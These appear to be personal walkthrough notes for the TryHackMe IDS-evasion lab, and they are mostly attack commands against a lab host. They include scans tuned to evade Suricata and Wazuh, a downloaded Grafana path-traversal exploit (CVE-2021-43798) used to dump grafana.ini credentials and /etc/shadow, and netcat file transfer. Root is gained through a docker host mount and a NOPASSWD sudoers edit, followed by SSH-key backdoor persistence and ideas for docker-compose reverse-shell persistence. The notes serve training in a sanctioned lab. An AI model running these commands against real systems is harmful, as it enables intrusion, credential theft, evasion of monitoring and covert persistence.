Lab link: https://tryhackme.com/room/idsevasion
## Env
https://developers.whatismybrowser.com/useragents/explore/
```sh
export thatIP="10.10.123.182"
export thatAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
```

```sh
nmap -sV $thatIP
```

```sh
nmap -sV --script-args http.useragent=$thatAgent $thatIP
```

Note, that this strategy isn't perfect as both Suricata and Wazuh are more than capable of detecting the activity from the aggressive scans. Try running the following nmap command with the new User-Agent:
```sh
nmap --script=vuln --script-args http.useragent=$thatAgent $thatIP
```

The above command tells nmap to use the vulnerability detection scripts against the target that can return a wealth of information. However, as you may have noticed they also generate a significant number of IDS alerts even when specifying a different User-Agent as a nmap probes for a large number of potential attack vectors. It is also possible to evade detection by using SYN (-sS) or "stealth" scan mode; however, this returns much less information as it will not perform any service or version detection, try running this now:
```sh
sudo nmap -sS $thatIP
```

these more aggressive scans can return more useful information in some cases. Let's start by running nikto with the minimum options:
```sh
nikto -p 80,3000 -h $thatIP
```

```sh
nikto -p 3000 -h $thatIP
```

Tuning options will control the test that Nikto will use against a target. By default, if any options are specified, only those tests will be performed. If the "x" option is used, it will reverse the logic and exclude only those tests. Use the reference number or letter to specify the type, multiple may be used:

```sh
nikto -p 3000 -T 1 2 3 -h $thatIP
```

```sh
nikto -p 3000 -T 1 2 3 -useragent $thatAgent -h $thatIP
```

```sh
nikto -p 3000 -T 1 2 3 -useragent $thatAgent -e 1 7 -h $thatIP
```

```sh
nmap -sV -p 1-8000 $thatIP
rustscan -a $thatIP -- -A
```

```
site:example.com filetype:pdf
```

https://nvd.nist.gov/vuln/detail/CVE-2021-43798

```sh
wget https://raw.githubusercontent.com/Jroo1053/GrafanaDirInclusion/master/exploit.py
python3 exploit.py -u $thatIP -p 3000 -f /etc/grafana/grafana.ini | grep 'admin_user\|admin_password'
```

```
admin_user = grafana-admin
admin_password = GraphingTheWorld32
```

```sh
python3 exploit.py -u $thatIP -p 3000 -f /etc/shadow
```

```sh
nmap --script=vuln $thatIP
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://$thatIP/FUZZ
```

```sh
ssh grafana-admin@$thatIP
```

In fact, privilege escalation is our first task as we are not yet root. The first step in privilege escalation is usually checking what permissions we currently have this, could save us a lot of work if we're already in the sudo group. There are a few different ways to check this including:

-   `sudo -l` this will return a list of all the commands that an account can run with elevated permissions via `sudo`
-   `groups` will list all of the groups that the current user is a part of.
-   `cat /etc/group` should return a list of all of the groups on the system and their members. This can help in locating users with higher access privileges and not just our own.

victim (receiver)
```sh
nc -l -p 1234 -q 1 > linpeas.sh
```
attacker (sender)
```sh
cat /home/wowon/Downloads/linpeas.sh | netcat $thatIP 1234
```

victim
```sh
docker run -it --entrypoint=/bin/bash -v /:/mnt/ ghcr.io/jroo1053/ctfscoreapache:master # Perintah ini akan bind direktori root (system) ke direktori root (docker), sehingga kita bisa mendapatkan seluruh akses ke storage asli
```

This will spawn a container in interactive mode, overwrite the default entry-point to give us a shell, and mount the hosts file system to root.  From within this container, we can then edit one of the following files to gain elevated privileges:

-   `/etc/group` We could add the`grafana-admin` account to the root group. Note, that this file is covered by the HIDS  
    
-   `/etc/sudoers` Editing this file would allow us to add the grafana-admin account to the sudoers list and thus, we would be able to run `sudo` to gain extra privileges. Again, this file is monitored by Wazuh.  In this case, we can perform this by running:  
```sh
echo "grafana-admin ALL=(ALL) NOPASSWD: ALL" >>/mnt/etc/sudoers # membuat user grafana-admin tidak memerlukan password untuk mendapatkan akses root
```  
    
-   We could add a new user to the system and join the root group via `/etc/passwd`. Again though, this activity is likely to be noticed by the HIDS

in system (not docker)
```sh
sudo su
```

# Establishing Persistence / backdoor

```sh
ssh-keygen
```

attacker
```sh
cat ~/.ssh/id_rsa.pub
```

victim
```sh
vim ~/.ssh/authorized_keys
```

attacker
```sh
ssh root@$thatIP
```

jika tidak punya authorized_keys (victim)
```sh
mkdir -p ~/.ssh && touch ~/.ssh/authorized_keys
chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys
```


wazu configuration
```sh
cat /var/ossec/etc/ossec.conf
```

This file lists all of the data sources that are covered by HIDS in this case, the following are enabled:

-   **File system monitoring** - As already mentioned this affects our ability to simply install ssh keys but, this also affects other persistence vectors like, `cron`, `systemd` and any attacks that require the installation of additional tools.
-   **System log collection** - This functionality will generate alerts when some post-exploitation actions are taken against the system like making SSH connections and login attempts.
-   **System inventory** - This tracks system metrics like open ports, network interfaces, packages, and processes. This affects our ability to open new ports for reverse shells and install new packages. Note, that this function currently, does not generate alerts by itself and requires the HIDS operator to write their own rules. However, A report would be available on an upstream log analysis platform like Kibana

Credentials for a docker registry could either be phished or extracted from`/root/.docker/config.json` as, this location stores the credentials used with the `docker login` command in plaintext.

```sh
cat /root/.docker/config.json
```

Note, that Docker monitoring is also available, however, it is not enabled in this case which gives us a few options:

-   We could hijack the existing container supply chain and use it to install a backdoor into one of the containers that are hosted by the system. This would be difficult to detect without additional container monitoring and scanning technology. Credentials for a docker registry could either be phished or extracted from`/root/.docker/config.json` as, this location stores the credentials used with the `docker login` command in plaintext. This won't work in this case though, as the host we compromised doesn't have internet access and there are no credentials in `/root/.docker/config.json`.  
    
-   We could modify the existing docker-compose setup to include a privileged SSH enabled container and mount the host's file system to it with `-v /:/hostOS`. The docker-compose file used to define the current setup isn't monitored by the file system integrity monitor as it's in `/var/lib.` Again though, this won't work well in this case as we don't have access to the internet though, you could transport the container images from the attack box to the compromised VM via SSH. You would also need to open up a new port for the ssh connection which, would show up on the system inventory report.  
    
-   We could modify an existing or new docker-compose setup by, abusing the `entrypoint` option to grant us a reverse shell. Using docker-compose also allows us to specify automatic restarts which increases the backdoor's resilience. This option also reverses the typical client-server connection model so, we won't need to open any new ports on the host.